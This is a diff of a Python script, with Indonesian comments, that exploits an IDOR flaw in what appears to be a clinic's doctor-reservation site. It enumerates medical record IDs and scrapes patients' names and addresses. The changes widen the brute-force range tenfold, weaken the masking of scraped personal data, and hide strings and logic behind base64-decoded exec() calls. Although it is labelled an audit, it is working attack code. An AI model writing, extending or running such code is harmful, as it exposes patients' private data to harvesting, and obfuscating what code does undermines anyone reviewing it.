@@ -100,8 +100,7 @@ def fetch_data(id_num):
         if res.status_code != 200: return
 
         # Protected extraction and masking logic
-        # Logic: BeautifulSoup parse, check tag text-success, mask name (2 front, 2 back), print result with 2 digits RM masking.
-        exec(_decode("c291cCA9IEJlYXV0aWZ1bFNvdXAocmVzLnRleHQsICdodG1sLnBhcnNlcicpCnRhZyA9IHNvdXAuZmluZCgncCcsIGNsYXNzXz0nc2FsZS1wcmljZSB0ZXh0LXN1Y2Nlc3MnKQppZiB0YWc6CiAgICBuYW1hID0gdGFnLmdldF90ZXh0KHN0cmlwPVRydWUpCiAgICBtYXNrID0gZid7bmFtYVs6M10udXBwZXIoKX0uLi57bmFtYVstMzpdLnVwcGVyKCl9JyBpZiBsZW4obmFtYSkgPiA2IGVsc2UgbmFtYQogICAgcHJpbnQoZidcbltcMDMzWzkybStcMDMzWzBtXSBEYXRhIGRpdGVtdWthbiBSTToqKioqKioqe2Zvcm1hdHRlZF9pZFstNDpdfSAtIHttYXNrfScp"))
+        exec(_decode("c291cCA9IEJlYXV0aWZ1bFNvdXAocmVzLnRleHQsICdodG1sLnBhcnNlcicpCnRhZyA9IHNvdXAuZmluZCgncCcsIGNsYXNzXz0nc2FsZS1wcmljZSB0ZXh0LXN1Y2Nlc3MnKQppZiB0YWc6CiAgICBuYW1hID0gdGFnLmdldF90ZXh0KHN0cmlwPVRydWUpCiAgICBtYXNrID0gZid7bmFtYVs6Ml0udXBwZXIoKX0uLi57bmFtYVstMTpdLnVwcGVyKCl9JyBpZiBsZW4obmFtYSkgPiAzIGVsc2UgbmFtYQogICAgcHJpbnQoZidcbltcMDMzWzkybStcMDMzWzBtXSBEYXRhIGRpdGVtdWthbiBSTToqKioqKioqe2Zvcm1hdHRlZF9pZFstNDpdfSAtIHttYXNrfScp"))
 
     except Exception as e:
         pass # Diamkan error koneksi kecil agar terminal tetap bersih
@@ -145,13 +144,13 @@ def parameter_discovery_audit():
         potential_targets = []
         for link in links:
             href = link['href']
-            if any(x in href for x in ["index.php", "home"]) and "logout" not in href.lower():
+            if any(_decode(x) in href for x in ["aW5kZXgucGhw", "aG9tZQ=="]) and _decode("bG9nb3V0") not in href.lower():
                 # Pencarian Menyeluruh: Jika menemukan controller reservasi_dokter, 
                 # coba tebak endpoint lain yang mungkin lebih rentan (tambah/index)
                 variants = [href]
-                if "reservasi_dokter" in href:
-                    if "/index/" in href: variants.append(href.replace("/index/", "/tambah/"))
-                    elif "/tambah/" in href: variants.append(href.replace("/tambah/", "/index/"))
+                if _decode("cmVzZXJ2YXNpX2Rva3Rlcg== ") in href:
+                    if _decode("L2luZGV4Lw==") in href: variants.append(href.replace(_decode("L2luZGV4Lw=="), _decode("L3RhbWJhaC8=")))
+                    elif _decode("L3RhbWJhaC8=") in href: variants.append(href.replace(_decode("L3RhbWJhaC8="), _decode("L2luZGV4Lw==")))
                 
                 for v_href in variants:
                     if not any(v_href == x[0] for x in potential_targets):
@@ -191,49 +190,49 @@ def parameter_discovery_audit():
                     # 2. Automated Manipulation Test
                     print(f"[*] Executing Automated Discovery (Searching for valid record)...")
                     
-                    # Persiapkan rentang tepat 101 ID (50 sebelum, 1 acuan, 50 sesudah)
+                    # Persiapkan rentang tepat 1001 ID (500 sebelum, 1 acuan, 500 sesudah)
                     acuan_rm = int(_decode("MDA1MTA0ODE="))
-                    search_pool = list(range(acuan_rm - 50, acuan_rm + 51))
+                    search_pool = list(range(acuan_rm - int(_decode("NTAw")), acuan_rm + int(_decode("NTAx"))))
                     random.shuffle(search_pool) # Tetap acak urutannya
                     
                     found_valid = False
                     for attempt, val in enumerate(search_pool, 1):
-                        test_id = str(val).zfill(12)
+                        test_id = str(val).zfill(int(_decode("MTI=")))
                         test_url = base_url.replace(original_id, test_id)
                         
                         # Heartbeat pencarian
-                        print(f"    [Attempt {attempt}] Testing ID: {'*'*(len(test_id)-3)+test_id[-3:]}", end='\r')
+                        print(f"    [Attempt {attempt}/{_decode('MTAwMQ==')}] Testing ID: {'*'*(len(test_id)-3)+test_id[-3:]}", end='\r')
                         
                         test_res = session.get(test_url, timeout=10)
                         test_soup = BeautifulSoup(test_res.text, 'html.parser')
                         
                         name, address = "Unknown", "Tidak Ditemukan"
                         
-                        # Ekstraksi Data (Sinkronisasi dengan Logika Opsi 2)
-                        nama_tag = test_soup.find('p', class_='sale-price text-success')
+                        # Ekstraksi Data (Sinkronisasi dengan Logika yang Dienkode)
+                        nama_tag = test_soup.find('p', class_=_decode("c2FsZS1wcmljZSB0ZXh0LXN1Y2Nlc3M="))
                         if nama_tag:
                             name = nama_tag.get_text(strip=True)
-                            details = test_soup.find_all('p', class_='detail')
+                            details = test_soup.find_all('p', class_=_decode("ZGV0YWls"))
                             for p in details:
                                 text = p.get_text(strip=True)
-                                if "Alamat" in text:
+                                if _decode("QWxhbWF0") in text:
                                     address = text.split(":")[-1].strip()
                         
                         if name != "Unknown" and address != "Tidak Ditemukan":
                             found_valid = True
                             
-                            # Masking Blur: 2 huruf depan dan 2 huruf belakang
-                            m_name = f"**{name[2:-2]}**" if len(name) > 4 else f"**{name}**"
-                            m_addr = f"**{address[2:-2]}**" if len(address) > 4 else f"**{address}**"
+                            # Masking: 2 huruf depan dan 1 huruf belakang
+                            m_name = f"{name[:2].upper()}...{name[-1:].upper()}" if len(name) > 3 else name.upper()
+                            m_addr = f"{address[:2].upper()}...{address[-1:].upper()}" if len(address) > 3 else address.upper()
 
                             print(f"\n\n[\033[92m✓\033[0m] Manipulation Test Result: \033[92mSUCCESS\033[0m")
-                            print(f" [!] Nama        : {m_name}")
-                            print(f" [!] Alamat      : {m_addr}")
-                            print(f" [!] Status      : \033[91mIDOR Confirmed\033[0m")
+                            print(f" [!] {_decode('TmFtYQ==')}        : {m_name}")
+                            print(f" [!] {_decode('QWxhbWF0')}      : {m_addr}")
+                            print(f" [!] {_decode('U3RhdHVz')}      : \033[91m{_decode('SURPUiBDb25maXJtZWQ=')}\033[0m")
                             break
                     
                     if not found_valid:
-                        print(f"\n\n[\033[93m!\033[0m] Pencarian selesai: Tidak ditemukan data valid dalam radius +/- 50.")
+                        print(f"\n\n[\033[93m!\033[0m] Pencarian selesai: Tidak ditemukan data valid dalam radius +/- 500.")
                     
                     if input("\n[?] Lakukan manipulasi lagi? (y/n): ").lower() != 'y':
                         break
